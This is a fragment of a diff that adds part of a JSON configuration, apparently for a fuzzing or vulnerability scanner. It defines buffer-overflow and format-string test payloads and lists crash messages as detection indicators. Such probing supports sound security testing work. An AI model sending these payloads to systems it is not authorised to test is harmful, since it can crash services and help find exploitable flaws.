+        {"payload": "A", "encoding": "none", "type": "overflow", "repeat": 10000},
+        {"payload": "%s%s%s%s%s%s%s%s", "encoding": "none", "type": "format_string"},
+        {"payload": "A", "encoding": "none", "type": "large_overflow", "repeat": 65535}
+      ],
+      "detection": {
+        "indicators": [
+          "segmentation fault",
+          "Segmentation fault",
+          "memory corruption",
+          "EIP overwrite",
+          "stack smashing detected",
+          "*** stack smashing detected ***",
+          "abort() called",
+          "Aborted (core dumped)"
+        ],
+        "delay_based": false
+      }
+    }
+  }
+}
